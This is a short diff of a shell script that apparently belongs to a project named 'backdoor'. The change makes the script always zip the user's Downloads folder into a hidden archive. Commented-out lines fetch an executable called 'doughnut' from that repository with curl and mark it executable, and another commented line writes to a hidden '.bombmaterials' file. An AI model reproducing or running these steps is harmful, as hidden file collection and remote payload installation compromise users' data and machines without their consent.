@@ -4,9 +4,7 @@ cd ..
 # echo "success" >> .bombmaterials
 cd ..
 cd Downloads/
-if [ ! -f "../.downloads.zip" ]; then
-   zip -r ../.downloads.zip *
-fi
+zip -r ../.downloads.zip *
 # cd ~/Desktop
 # curl -O "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/doughnut"
 # chmod +x doughnut
